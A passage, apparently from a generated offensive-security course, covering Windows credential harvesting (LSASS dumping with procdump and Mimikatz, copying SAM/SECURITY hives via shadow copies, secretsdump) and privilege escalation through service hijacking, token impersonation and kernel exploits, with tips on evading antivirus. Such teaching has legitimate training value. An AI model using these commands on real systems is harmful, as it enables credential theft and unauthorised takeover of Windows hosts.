\"credential\", \"pass\" -IgnoreCase\r\n    ```\r\n    *   `Select-String`: Searches for text within files.\r\n    *   `-Pattern`: The keyword(s) to search for.\r\n    *   `-IgnoreCase`: Makes the search case-insensitive.\r\n\r\n*   **Looking for RDP Files:** Users often save RDP connection files with credentials.\r\n    ```powershell\r\n    Get-ChildItem -Path C:\\Users -Recurse -Include *.rdp -ErrorAction SilentlyContinue\r\n    ```\r\n    If found, open the `.rdp` file in a text editor; sometimes credentials (or at least the username) are saved within them.\r\n\r\n*   **Browser History/Saved Passwords:** While direct extraction from running browsers is tricky and depends heavily on the browser version and security, knowing *where* browser profiles are stored is useful. Tools often target these locations.\r\n    *   Chrome: `%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\`\r\n    *   Firefox: `%APPDATA%\\Mozilla\\Firefox\\Profiles\\`\r\n    *   Edge (Chromium): `%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\`\r\n\r\n**Practical Tip:** Start broad (`Get-ChildItem -Recurse`), then filter (`-Include`), then search contents (`Select-String`). Be mindful of the potential volume of data. Target user profile directories first as they are most likely to contain user-specific sensitive data.\r\n\r\n### **2.3: Enumerating Installed Software and Patches**\r\n\r\nKnowing what software is installed helps identify potential vulnerabilities, interesting applications (like password managers, VPN clients, admin tools), and missing security patches.\r\n\r\n**Why Enumerate Software/Patches?**\r\n\r\n*   **Vulnerability Identification:** Older versions of software might have known public exploits (CVEs).\r\n*   **Finding Useful Tools:** Discover applications that might contain credentials (e.g., Putty, WinSCP configuration files), or admin tools that could be leveraged.\r\n*   **Patch Level Assessment:** Missing security patches can indicate system vulnerability, potentially to kernel exploits or other system-level attacks (Module 3!).\r\n\r\n**Techniques & Commands:**\r\n\r\n*   **Using WMIC (Classic but can be slow):**\r\n    ```cmd\r\n    wmic product get name,version\r\n    ```\r\n    *   This queries the Windows Installer provider. It's often slow and can sometimes even trigger re-configuration of installed software. Use with caution.\r\n\r\n*   **Using PowerShell (More Recommended):**\r\n    ```powershell\r\n    # Get list of installed applications (generally faster than WMIC)\r\n    Get-Package\r\n\r\n    # Get list of installed Hotfixes/Patches\r\n    Get-HotFix\r\n    ```\r\n    *   `Get-Package`: Works well on newer Windows versions (Windows 8/Server 2012 R2 and later). Provides name, version, and source.\r\n    *   `Get-HotFix`: Lists installed Windows updates/patches. Compare this list against known critical security updates to identify missing patches.\r\n\r\n**Practical Tip:** Combine `Get-Package` and `Get-HotFix` output with vulnerability databases (like NVD) or security tools (though this course focuses on offensive techniques, awareness of defensive tools helps understand detection) to identify potential software-based attack vectors.\r\n\r\n### **2.4: Understanding Windows Credential Storage Locations**\r\n\r\nThis is the core of credential harvesting. Windows needs to store and manage credentials for users to log in, access resources, and run services. Understanding *where* it stores them is key to knowing *how* to steal them.\r\n\r\nThink of Windows as having several \"vaults\" for credentials:\r\n\r\n1.  **LSASS (Local Security Authority Subsystem Service):**\r\n    *   This is a critical Windows process (`lsass.exe`).\r\n    *   It handles security policy, user authentication, and manages credentials for currently logged-on users and active system processes.\r\n    *   It holds various credential representations in memory:\r\n        *   **Cleartext Passwords:** Sometimes, if certain security policies are enabled or on older systems. *Highly valuable!*\r\n        *   **NTLM Hashes:** Cryptographic hashes of user passwords (specifically, the NTLM hash).\r\n        *   **Kerberos Tickets:** Both Ticket Granting Tickets (TGTs) and Service Tickets (TGSs). These can be reused (Pass-the-Ticket).\r\n        *   **LSA Secrets:** System-level credentials used by services or the machine account.\r\n    *   Accessing LSASS memory requires high privileges (typically Administrator or SYSTEM).\r\n\r\n2.  **SAM and SECURITY Registry Hives:**\r\n    *   These are files located at `C:\\Windows\\System32\\config\\SAM` and `C:\\Windows\\System32\\config\\SECURITY`.\r\n    *   **SAM (Security Account Manager):** Contains the local user accounts database, including their NTLM password hashes. This is for *local* accounts on that specific machine.\r\n    *   **SECURITY:** Contains the LSA Secrets, which can include cached domain controller credentials, service account passwords, and other system-level secrets.\r\n    *   These files are locked while Windows is running normally. To access them, you need SYSTEM privileges and often need to access them *offline* or via a method that bypasses the file lock (like Volume Shadow Copy).\r\n\r\n3.  **Credential Manager:**\r\n    *   This is a user-specific store (`%APPDATA%\\Microsoft\\Credentials` and `%LOCALAPPDATA%\\Microsoft\\Credentials`).\r\n    *   Users can save credentials here for things like:\r\n        *   RDP connections\r\n        *   Network shares\r\n        *   Websites (less common now, browsers handle this)\r\n        *   Specific applications\r\n    *   These credentials are encrypted using the user's login credentials as part of the key derivation. Accessing *another user's* Credential Manager requires SYSTEM privileges to decrypt their data.\r\n\r\n4.  **LSA Secrets (Older/Specific):**\r\n    *   While some LSA Secrets are in the SECURITY hive, some might be accessible differently. These often relate to machine accounts, service accounts, or cached domain credentials.\r\n\r\nUnderstanding these locations tells us *where* our tools need to look and *what privileges* are required for each method.\r\n\r\n### **2.5: Dumping LSASS Process Memory**\r\n\r\nThis is arguably the most common and often most fruitful method for harvesting credentials from a live system.\r\n\r\n**Why Dump LSASS?** Because it holds the most *current* and *active* credential information, including sometimes cleartext passwords or easily reusable hashes/tickets.\r\n\r\n**Requirement:** Administrator or SYSTEM privileges on the target machine.\r\n\r\n**Technique 1: Using `procdump` (Sysinternals)**\r\n\r\n`procdump` is a legitimate Microsoft Sysinternals tool used by developers and administrators to troubleshoot application crashes by creating process dumps. We can repurpose it to dump the memory of `lsass.exe`.\r\n\r\n*   **Step 1: Obtain `procdump`:** Download the Sysinternals suite or just `procdump.exe`. You'll need to get this executable onto the target machine (or run it remotely if you have that capability).\r\n*   **Step 2: Run `procdump` on `lsass.exe`:**\r\n    ```cmd\r\n    procdump.exe -accepteula -ma lsass.exe lsass.dmp\r\n    ```\r\n    *   `-accepteula`: Automatically accepts the End-User License Agreement.\r\n    *   `-ma`: Writes a dump file with all process memory. This is crucial for capturing credentials.\r\n    *   `lsass.exe`: The target process name.\r\n    *   `lsass.dmp`: The output file name for the memory dump.\r\n*   **Step 3: Exfiltrate the dump file:** Copy `lsass.dmp` from the target machine back to your attacker machine.\r\n*   **Step 4: Analyze the dump file:** Use a tool *on your attacker machine* to read the `lsass.dmp` file and extract credentials. The most famous tool for this is **Mimikatz**.\r\n\r\n**Technique 2: Using Mimikatz (Direct or via Loader)**\r\n\r\nMimikatz, created by Benjamin Delpy (`@gentilkiwi`), is the *de facto* tool for Windows credential operations. It can interact directly with LSASS memory or analyze dump files. *However*, directly executing `mimikatz.exe` is *highly* likely to be detected and blocked by Antivirus (AV) and Endpoint Detection and Response (EDR) solutions.\r\n\r\nAttackers and red teamers use various methods to run Mimikatz functionality while avoiding detection, such as:\r\n*   Reflective DLL injection (running the Mimikatz DLL directly in memory).\r\n*   Loading it via PowerShell (e.g., `Invoke-Mimikatz` from PowerSploit).\r\n*   Using custom loaders or obfuscated versions.\r\n\r\nFor the purpose of this module, we will focus on the *concept* and the *output* you'd expect, and use `Invoke-Mimikatz` from PowerSploit in the lab exercise as a common method (while acknowledging it might require AV bypass in a real scenario, which is a topic for more advanced courses).\r\n\r\n*   **Conceptual Steps (using `Invoke-Mimikatz`):**\r\n    *   Get the `Invoke-Mimikatz.ps1` script onto the target.\r\n    *   Import the script: `Import-Module .\\Invoke-Mimikatz.ps1`\r\n    *   Run the relevant command: `Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'`\r\n    *   The output will appear directly in your PowerShell session.\r\n\r\n*   **Analyzing a Dump File with Mimikatz (on your attacker machine):**\r\n    *   Transfer `lsass.dmp` to your attacker machine.\r\n    *   Run Mimikatz (the executable).\r\n    *   Point Mimikatz to the dump file: `sekurlsa::minidump lsass.dmp`\r\n    *   Run the command to extract passwords: `sekurlsa::logonpasswords`\r\n    *   Exit Mimikatz: `exit`\r\n\r\n**Expected Mimikatz Output (Conceptual):**\r\n\r\nMimikatz output is verbose but incredibly valuable. Look for sections like:\r\n\r\n```\r\nAuthentication Id : 0 ; 999 (00000000:000003e7)\r\nSession           : Interactive from 2\r\nUser Name         : targetuser\r\nDomain            : TARGETDOMAIN\r\nLogon Server      : TARGETDC\r\n...\r\n msv            : [00000003]\r\n -> primary\r\n    * Username : targetuser\r\n    * Domain   : TARGETDOMAIN\r\n    * NTLM     : 11223344556677889900AABBCCDDEEFF\r\n    * SHA1     : AABBCCDDEEFF11223344556677889900AABBCCDD\r\n    * CredentialData : (null)\r\n -> logon sspi\r\n    * Username : targetuser\r\n    * Domain   : TARGETDOMAIN\r\n    * Password : ReallySecretPassword123!   <-- !!! Cleartext passwords are GOLD !!!\r\n...\r\n kerberos       : [00000001]\r\n -> primary\r\n    * Username : targetuser\r\n    * Domain   : TARGETDOMAIN\r\n    * NTLM     : 11223344556677889900AABBCCDDEEFF\r\n    * SHA1     : AABBCCDDEEFF11223344556677889900AABBCCDD\r\n    * Kerberos : (null)\r\n    * Pkinit   : (null)\r\n...\r\n```\r\n\r\nLook for `Password :` followed by cleartext, or the `NTLM :` hash. The NTLM hash can often be used directly for authentication (Pass-the-Hash, Module 6!).\r\n\r\n**OpSec Note:** Accessing or dumping LSASS is a *very* common detection signature for security products. In a real red team engagement, this requires careful planning and likely AV/EDR bypass techniques. For our lab, we'll accept the risk of detection as we focus on the technique itself.\r\n\r\n### **2.6: Extracting from SAM and SECURITY Registry Hives**\r\n\r\nWhile LSASS is the primary target for *active* credentials, the SAM and SECURITY hives contain local user hashes and system secrets that can be valuable, especially if LSASS dumping is blocked or fails.\r\n\r\n**Why Target SAM/SECURITY Hives?**\r\n*   Contains local user password hashes (SAM hive).\r\n*   Contains LSA Secrets (SECURITY hive), which can include cached domain credentials, service account passwords, etc.\r\n\r\n**Requirement:** SYSTEM privileges on the target machine are generally needed to access these files or their contents reliably.\r\n\r\n**Techniques:**\r\n\r\nThe challenge is that these files (`C:\\Windows\\System32\\config\\SAM`, `SECURITY`, `SYSTEM`) are locked by the operating system while it's running.\r\n\r\n1.  **Offline Access:** If you have physical access or can boot the machine from a different OS (like a Linux live CD), you can mount the Windows drive and simply copy these files.\r\n    *   Copy `C:\\Windows\\System32\\config\\SAM`\r\n    *   Copy `C:\\Windows\\System32\\config\\SECURITY`\r\n    *   Copy `C:\\Windows\\System32\\config\\SYSTEM` (The `SYSTEM` hive is needed to decrypt the contents of the `SECURITY` hive).\r\n    *   Analyze these files on your attacker machine using tools like Impacket's `secretsdump.py`.\r\n\r\n2.  **Volume Shadow Copy (VSS):** This is a common technique used by attackers to access locked files on a live system. VSS creates snapshots of volumes, and files in snapshots are not locked by the running OS.\r\n    *   **Step 1: Create a Shadow Copy:**\r\n        ```cmd\r\n        vssadmin create shadow /for=C:\r\n        ```\r\n        This command will output the path to the shadow copy (e.g., `\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\`). Note this path down.\r\n    *   **Step 2: Copy Hives from the Shadow Copy:** Use the shadow copy path to access the files.\r\n        ```cmd\r\n        copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SAM C:\\Temp\\sam.hiv\r\n        copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SECURITY C:\\Temp\\security.hiv\r\n        copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SYSTEM C:\\Temp\\system.hiv\r\n        ```\r\n        *(Replace `X` with the correct shadow copy number and `C:\\Temp\\` with your desired location)*\r\n    *   **Step 3: Delete the Shadow Copy (OpSec):** Clean up the shadow copy you created.\r\n        ```cmd\r\n        vssadmin delete shadows /for=C: /Quiet\r\n        ```\r\n    *   **Step 4: Exfiltrate the hive files:** Copy `sam.hiv`, `security.hiv`, and `system.hiv` from the target machine to your attacker machine.\r\n    *   **Step 5: Analyze the hive files:** Use a tool *on your attacker machine* to extract hashes and secrets. Impacket's `secretsdump.py` is excellent for this.\r\n\r\n*   **Using `secretsdump.py` (Impacket - on attacker machine):**\r\n    ```bash\r\n    secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL\r\n    ```\r\n    *   This command takes the three hive files as input and will output local user NTLM hashes (from SAM) and LSA Secrets (from SECURITY).\r\n\r\n*   **Using Mimikatz (Live or via Shadow Copy):** Mimikatz can also dump SAM and SECURITY hives directly, often automating the VSS step or using other techniques.\r\n    *   **Conceptual Command:** `mimikatz.exe \"lsadump::sam\" exit` or `mimikatz.exe \"token::elevate\" \"lsadump::sam\" exit` (if needing to elevate first). `lsadump::secrets` for LSA Secrets.\r\n\r\n**Expected Output (SAM/SECURITY Hive Analysis):**\r\n\r\n*   **SAM:** You'll get a list of local users and their NTLM hashes in a format like:\r\n    `Username:RID:LMHash:NTLMHash:::`. The LM hash is usually empty on modern systems. The NTLM hash is the important part.\r\n    `Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::` (This is the hash for a blank password - very common in labs!)\r\n    `LocalUser:1001:NO PASSWORD*********************:AABBCCDDEEFF11223344556677889900:::`\r\n\r\n*   **SECURITY (LSA Secrets):** You might find cached domain credentials, service account passwords, or other system secrets. The output format varies but look for things like `_SC_` (Service Control) entries or cached domain logons.\r\n\r\n**OpSec Note:** Creating shadow copies and copying hive files leaves forensic artifacts (event logs, file access timestamps). Executing tools like Mimikatz or scripts that automate this are also high-detection activities.\r\n\r\n###"

      "content": "Alright team, buckle up! We've secured that initial foothold, which is fantastic! But let's be real – landing as a standard user on a Windows box usually means we're still quite limited. We can look around a bit, maybe poke at some files, but we can't install tools, modify critical system settings, or access sensitive data protected by Administrator permissions.\r\n\r\nThis is where Module 3 comes in. This is where we turn that humble user access into the keys to the kingdom on that specific host. This module is all about **Privilege Escalation (PE)** – the art and science of elevating our access from a low-privileged user to a high-privileged user, typically Administrator or even SYSTEM.\r\n\r\nThink of it like getting past the first guard at the gate (initial access), but then needing to find a way to get the master key instead of just a visitor's badge.\r\n\r\n---\r\n\r\n## **Module 3: Windows Privilege Escalation**\r\n\r\n**Module Objective:** By the end of this module, you will be able to systematically enumerate a Windows host for common privilege escalation vectors and successfully exploit at least one method to gain Administrator or SYSTEM level access in a lab environment.\r\n\r\n**The \"Why\":** Why is PE so critical?\r\n1.  **Access to Sensitive Data:** Administrators and SYSTEM have access to nearly all files, registry keys, and processes on the host. This is where you find sensitive documents, configuration files, and crucially, credentials cached in memory or stored locally.\r\n2.  **Persistence:** Higher privileges make it much easier to establish persistent backdoors (e.g., installing services, modifying startup locations that run with high privileges).\r\n3.  **Springboard for Lateral Movement:** Administrator or SYSTEM access on one machine often provides credentials or tokens that can be reused or leveraged to authenticate to *other* machines in the network, especially in a domain environment.\r\n4.  **Control:** With high privileges, you can disable security software, clear logs, modify system behavior, and generally operate with less restriction.\r\n\r\n**The Mindset:** Privilege escalation isn't usually one magic bullet. It's a process of:\r\n1.  **Thorough Enumeration:** What is running? What software is installed? What are the permissions on key files and services? What patches are missing? What are the user's current privileges?\r\n2.  **Identifying Weaknesses:** Based on your enumeration, spot misconfigurations, known vulnerabilities, or design flaws.\r\n3.  **Planning the Attack:** Determine which identified weakness is most likely to succeed and requires the least risk/noise.\r\n4.  **Execution:** Carry out the exploit.\r\n5.  **Verification:** Confirm you now have higher privileges.\r\n\r\nLet's dive deep into the core concepts and techniques!\r\n\r\n---\r\n\r\n### **3.1 Understanding Windows Integrity Levels and UAC**\r\n\r\nBefore we exploit, we need to understand the security model we're trying to bypass.\r\n\r\n*   **Security Identifiers (SIDs):** Every user, group, and service account in Windows has a unique SID (e.g., `S-1-5-21-...-500` for the built-in Administrator). Permissions are granted to SIDs, not just names.\r\n*   **Access Control Lists (ACLs):** Objects (files, folders, registry keys, services, processes, shares) have ACLs which contain Access Control Entries (ACEs). Each ACE specifies permissions (Read, Write, Execute, Modify, Full Control) for a specific SID. PE often involves finding objects where a low-privileged user's SID has more permissions than intended.\r\n*   **Integrity Levels (IL):** Introduced in Windows Vista (along with UAC), ILs add another layer to the security model. Processes run at different integrity levels:\r\n    *   **Low:** Highly restricted (e.g., Internet Explorer in Protected Mode). Cannot write to most system locations.\r\n    *   **Medium:** Standard user processes. Cannot write to system directories without elevation prompt.\r\n    *   **High:** Administrator processes (after UAC elevation).\r\n    *   **SYSTEM:** The highest privilege level. Used by the OS kernel and core services. Has full control over the system.\r\n    *   **Trusted Installer:** Even higher than SYSTEM for specific protected system files.\r\n\r\n    A process running at a lower integrity level *cannot* write to or modify objects running at a higher integrity level. This is a fundamental security boundary.\r\n\r\n*   **User Account Control (UAC):** This is probably what you see most often. When a standard user (Medium IL) tries to perform an action requiring Administrator privileges (e.g., installing software, changing system-wide settings), Windows prompts the user.\r\n    *   If the user *is* a member of the Administrators group, they get a consent prompt (\"Do you want to allow this app...\"). If they click \"Yes,\" the process is launched with High integrity.\r\n    *   If the user is *not* a member of the Administrators group, they get a credentials prompt, requiring them to enter an administrator username and password.\r\n\r\n    **Crucially:** UAC is designed to *prevent accidental* administrative actions and require user *consent*. It is **not** a security boundary against malicious code already running on the system *if* that code can interact with processes or components that are designed to auto-elevate or are vulnerable. A UAC bypass allows a Medium integrity process to launch a High integrity process *without* the user seeing or approving the prompt.\r\n\r\n### **3.2 Common Privilege Escalation Vectors**\r\n\r\nNow that we understand the target environment's security features, let's look at specific weaknesses we can exploit. Remember, **enumeration is key** to finding these!\r\n\r\n#### **3.2.1 Vulnerable Services**\r\n\r\nServices are background processes that often run with high privileges (SYSTEM, LocalSystem, LocalService, NetworkService) and start automatically when the system boots. Misconfigurations here are a goldmine for PE.\r\n\r\n*   **What to Enumerate:**\r\n    *   List all services: `Get-Service` (PowerShell) or `tasklist /svc` (CMD).\r\n    *   Check service configuration: `sc qc <service_name>` (CMD) or `Get-CimInstance win32_service -Filter \"Name='<service_name>'\" | Select-Object Name, DisplayName, PathName, StartMode, State, Status, ServiceType, StartName` (PowerShell). Look at `PathName` (the executable path) and `StartName` (the account it runs as, usually SYSTEM or LocalSystem).\r\n    *   Check permissions on the service executable path: `icacls \"<path_to_service_exe>\"` (CMD) or `Get-Acl \"<path_to_service_exe>\" | Format-List Path, Owner, Access` (PowerShell). Look for Write/Modify permissions for 'BUILTIN\\Users' or 'Everyone'.\r\n    *   Check permissions on the service configuration key in the registry: Services are configured under `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service_name>`. Check permissions on this key using `reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service_name> /v SD` (CMD, then interpret SDDL) or `Get-Acl \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<service_name>\" | Format-List Path, Owner, Access` (PowerShell). Look for Write permissions for low-priv groups.\r\n\r\n*   **Common Vulnerabilities & Exploitation:**\r\n\r\n    *   **Unquoted Service Path:** If the `PathName` of a service contains spaces and is *not* enclosed in quotes, Windows will try to execute the path segment by segment until it finds an executable.\r\n        *   Example Path: `C:\\Program Files\\My Service\\service.exe`\r\n        *   Windows tries to execute:\r\n            1.  `C:\\Program.exe`\r\n            2.  `C:\\Program Files\\My.exe`\r\n            3.  `C:\\Program Files\\My Service\\service.exe` (the legitimate service)\r\n        *   If you, as a low-privileged user, have write permissions to `C:\\Program Files\\`, you could place a malicious `My.exe` there. The next time the service starts (system boot, manual start, or crash/restart), your malicious `My.exe` will execute *with the service's privileges* (often SYSTEM) instead of the legitimate service.\r\n        *   **Identification:** Look for services where `PathName` contains spaces and is missing quotes.\r\n            ```powershell\r\n            Get-CimInstance win32_service | Where-Object {$_.PathName -notmatch '\"' -and $_.PathName -match '\\s'} | Select-Object Name, DisplayName, PathName, StartName\r\n            ```\r\n            ```cmd\r\n            wmic service get name,pathname,startmode | findstr /i \"Auto\" | findstr /i \"System\" | findstr /v \"\"\"\r\n            ```\r\n            (The CMD version is less precise but can find some). Then verify directory permissions using `icacls` on the directories (`C:\\`, `C:\\Program Files\\`, etc.).\r\n        *   **Exploitation:**\r\n            1.  Confirm you have write permissions to the directory where you'll place your malicious executable (e.g., `C:\\Program Files\\`).\r\n            2.  Create a malicious executable (e.g., `my.exe`) that performs your desired action (add a user, launch a shell, etc.). Make sure its name matches the segment Windows will try to execute (e.g., `My.exe` for `C:\\Program Files\\My Service\\service.exe`).\r\n            3.  Place `my.exe` in the vulnerable directory.\r\n            4.  Restart the service (if possible and low-risk, otherwise wait for system restart) using `Restart-Service <service_name>` (PowerShell) or `sc stop <service_name>` then `sc start <service_name>` (CMD). *Be cautious restarting services, it might break things!*\r\n            5.  Your `my.exe` should execute with the service's privileges.\r\n\r\n    *   **Weak Service Permissions (Service Binary/Configuration):** If a low-privileged user has write/modify permissions on the service's executable file (`PathName`) or its registry configuration key, they can alter the service's behavior.\r\n        *   **Identification:** Check permissions as described above using `icacls` or `Get-Acl`. Look for 'Write' or 'Modify' permissions for your user or groups you belong to on the service executable or its registry key.\r\n            ```powershell\r\n            # Check permissions on the service executable (replace path)\r\n            Get-Acl \"C:\\Program Files\\Vulnerable Service\\vulnerable.exe\" | Format-List Path, Owner, Access\r\n\r\n            # Check permissions on the service registry key (replace service name)\r\n            Get-Acl \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService\" | Format-List Path, Owner, Access\r\n            ```\r\n        *   **Exploitation (Modifying Binary):**\r\n            1.  If you have write access to the service executable, rename the original (`vulnerable.exe` to `vulnerable.exe.bak`).\r\n            2.  Place your malicious executable (named `vulnerable.exe`) in its place.\r\n            3.  Restart the service. Your malicious executable runs with service privileges.\r\n        *   **Exploitation (Modifying Config):**\r\n            1.  If you have write access to the service's registry key, you can modify the `ImagePath` value to point to your malicious executable.\r\n            2.  Restart the service. Your malicious executable runs.\r\n            ```powershell\r\n            # Example: Modify ImagePath (replace service and path)\r\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService\" -Name \"ImagePath\" -Value \"C:\\Path\\To\\Your\\Malicious.exe\"\r\n            # Then restart service\r\n            Restart-Service VulnerableService\r\n            ```\r\n            *Again, be very careful modifying service configurations or binaries, this can easily break the system!*\r\n\r\n#### **3.2.2 Token Manipulation / Impersonation**\r\n\r\nWindows uses \"tokens\" to represent the security context of a user or process. Tokens contain SIDs, privileges, integrity levels, etc. Certain privileges allow a process to impersonate another user's token.\r\n\r\n*   **`SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`:** If a user or service account holds one of these privileges, they *might* be able to impersonate other logged-on users or service accounts on that system. Web servers or database servers often hold `SeImpersonatePrivilege` to impersonate clients.\r\n*   **Identification:** Check your current user's privileges using `whoami /priv` (CMD) or `(Get-CimInstance win32_tokenprivileges -Filter \"GetEnabled='true'\").Privileges | Where-Object {$_.DisplayName -like '*impersonate*' -or $_.DisplayName -like '*assign*'}` (PowerShell - rough example).\r\n*   **Exploitation:** This is typically exploited using tools like Mimikatz's `incognito` module.\r\n    ```\r\n    # Example Mimikatz usage (requires Admin or SeDebugPrivilege)\r\n    sekurlsa::logonpasswords  # Dumps credentials from LSASS\r\n    incognito::list_tokens    # Lists impersonatable tokens\r\n    incognito::impersonate_token <Token_ID_or_Username> # Impersonate a token\r\n    # Or often used after getting SeDebugPrivilege to access LSASS\r\n    ```\r\n    **Teacher's Note:** Mimikatz is a *very* powerful tool for Windows security analysis, but it's also heavily detected by AV/EDR. Using it directly often requires bypassing security software. The `incognito` module allows you to potentially elevate *without* dumping credentials directly, by just leveraging existing tokens.\r\n\r\n#### **3.2.3 Insecure File and Registry Permissions**\r\n\r\nSimilar to services, general file system or registry objects can have weak permissions allowing low-privileged users to modify files or keys that are later used or executed by high-privileged processes.\r\n\r\n*   **What to Enumerate:**\r\n    *   Permissions on critical directories: `C:\\`, `C:\\Program Files`, `C:\\Program Files (x86)`, `C:\\Windows\\System32`, `C:\\Windows\\Tasks`. Use `icacls <directory>`.\r\n    *   Permissions on specific files in those directories, especially `.exe`, `.dll`, `.bat`, `.ps1`, `.vbs` files.\r\n    *   Permissions on common persistence locations in the registry: `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`, `HKCU\\...Run`, `HKLM\\...\\RunOnce`, `HKLM\\SYSTEM\\CurrentControlSet\\Services` (covered in services), Scheduled Tasks keys. Use `reg query <key> /v SD` or `Get-Acl <Registry::Path>`.\r\n    *   Permissions on program directories where high-privilege software is installed.\r\n*   **Identification:** Look for 'Write' or 'Modify' permissions for 'BUILTIN\\Users' or 'Everyone' on files/keys that high-privilege processes interact with or execute.\r\n    ```powershell\r\n    # Example: Check permissions on a common Run key\r\n    Get-Acl \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" | Format-List Path, Owner, Access\r\n\r\n    # Example: Find writable files in Program Files (this can be slow!)\r\n    # Adjust filter/depth as needed. Be careful with recursion.\r\n    Get-ChildItem -Path \"C:\\Program Files\" -Recurse -Force -ErrorAction SilentlyContinue | Get-Acl -ErrorAction SilentlyContinue | Where-Object {$_.AccessToString -match \"BUILTIN\\\\Users.*\\(M\\)\" -or $_.AccessToString -match \"Everyone.*\\(M\\)\" -or $_.AccessToString -match \"BUILTIN\\\\Users.*\\(W\\)\" -or $_.AccessToString -match \"Everyone.*\\(W\\)\"} | Select-Object Path\r\n    ```\r\n*   **Exploitation:**\r\n    *   **DLL Hijacking:** If a high-privilege process tries to load a DLL from a directory where you have write permissions, you can place a malicious DLL with the expected name there. The process might load *your* DLL instead of the legitimate one, executing your code with its privileges. This is complex and requires understanding DLL loading order.\r\n    *   **Executable Replacement:** If you have write access to an executable that's run by a high-privilege process (e.g., a scheduled task running as SYSTEM), you can replace the executable with your own.\r\n    *   **Registry Modification:** If you can write to a registry key that a high-privilege process reads or executes (like a Run key or a service `ImagePath`), you can inject a command or path to your malicious code.\r\n\r\n#### **3.2.4 Auto-logon Credentials / Saved RDP Credentials**\r\n\r\nSometimes systems are configured for automatic logon, storing credentials (often obfuscated) in the registry. Or users might save RDP credentials. While not a *privilege escalation* on the *current* host itself, finding these can give you high-privilege credentials for the *same* host or *other* hosts, effectively bypassing the need for a traditional PE exploit.\r\n\r\n*   **Identification:** Look in the registry: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` for `AutoAdminLogon`, `DefaultUserName`, `DefaultPassword`. Look for saved RDP connections and potentially extract credentials (though this is harder and often requires Admin).\r\n*   **Exploitation:** Use tools (like Mimikatz or specific credential extractors) to retrieve the cleartext password or hash from the registry.\r\n\r\n#### **3.2.5 Kernel Exploits**\r\n\r\nThese exploit vulnerabilities in the Windows kernel itself. They are often highly reliable for PE *if* the target system is running a vulnerable version of the kernel and hasn't been patched.\r\n\r\n*   **How they work (Conceptually):** Kernel exploits typically involve tricking the kernel into executing malicious code in kernel mode, or manipulating kernel data structures to grant the attacker's process SYSTEM privileges.\r\n*   **Identification:** This is primarily about **identifying the exact OS version and patch level** of the target (`systeminfo`, `Get-ComputerInfo`, `Get-HotFix`). Then, compare this information against public databases of known Windows kernel vulnerabilities and available exploits (e.g., Exploit-DB, security advisories).\r\n*   **Exploitation:** Using a pre-compiled exploit binary or script designed for the *specific* vulnerable OS version/patch.\r\n    *   **Teacher's Note:** Kernel exploits are powerful but risky. They can cause Blue Screens of Death (BSODs), are highly signatured by AV/EDR, and require precise targeting. In a real engagement, they are often a last resort. In a lab, they are valuable for understanding, but always use stable, known exploits and be prepared to snapshot/revert the VM. We will *not* be writing kernel exploit code, but rather focusing on identifying the *opportunity* and using existing tools if available in the lab.\r\n\r\n### **3.3 Automated PE Tools**\r\n\r\nManually enumerating all the potential vectors above can be time-consuming. Fortunately, several excellent tools automate this process. They scan the system, look for common misconfigurations and vulnerabilities, and report potential PE paths.\r\n\r\n*   **`PowerUp` (PowerShell):** Part of the PowerSploit framework, `PowerUp` is a PowerShell script specifically designed to find common Windows PE vectors like vulnerable services, DLL hijacking opportunities, AlwaysInstallElevated, etc.\r\n    *   **Usage:**\r\n        1.  Load the script: `Import-Module .\\PowerUp.ps1` or dot-source it `. .\\PowerUp.ps1`.\r\n        2.  Run the main check function: `Invoke-AllChecks`\r\n    *   **Output:** `Invoke-AllChecks` will output a list of potential vulnerabilities found, often with suggestions on how to exploit them.\r\n    *   **Teacher's Note:** PowerShell scripts might be blocked by execution policies or Antivirus. You might need to bypass these, which is a separate topic (OpSec!).\r\n\r\n*   **`WinPEAS` (Windows Privilege Escalation Awesome Scripts):** A standalone executable (`.exe`) that performs extensive local enumeration. It checks for file/registry permissions, services, processes, scheduled tasks, installed software, network information, credentials in files, and much more. It has both `.bat` and `.exe` versions, and different editions (e.g., `winPEASany.exe`).\r\n    *   **Usage:** Download and run the appropriate version.\r\n        ```cmd\r\n        # Basic execution\r\n        winPEASany.exe\r\n\r\n        # Output to file\r\n        winPEASany.exe > winpeas_results.txt\r\n        ```\r\n    *   **Output:** `WinPEAS` prints its findings to the console, often color-coded. It highlights potential vulnerabilities.\r\n    *   **Teacher's Note:** `WinPEAS` is often detected by AV/EDR. You might need to use obfuscated versions or run it from memory.\r\n\r\n*   **`Sherlock` (PowerShell):** A PowerShell script focused on finding missing software patches that correspond to known kernel exploits. It compares the installed patches against a list of vulnerabilities.\r\n    *   **Usage:**\r\n        1.  Load the script: `Import-Module .\\Sherlock.ps1` or `. .\\Sherlock.ps1`.\r\n        2.  Run the check: `Find-AllVulns`\r\n    *   **Output:** Lists potential kernel vulnerabilities based on missing patches.\r\n    *   **Teacher's Note:** `Sherlock` only tells you *if* the system is vulnerable, not *how* to exploit it. You'd then need to find a reliable exploit for the reported CVE.\r\n\r\n**Important Note on Automated Tools:** These tools are *enumerators*. They *find* potential weaknesses. They don't always *exploit* them for you (though `PowerUp` has some exploitation functions). You still need to understand *why* the reported issue is a vulnerability and *how* to manually or semi-automatically exploit it. Relying solely on tools without understanding is a recipe for failure and getting 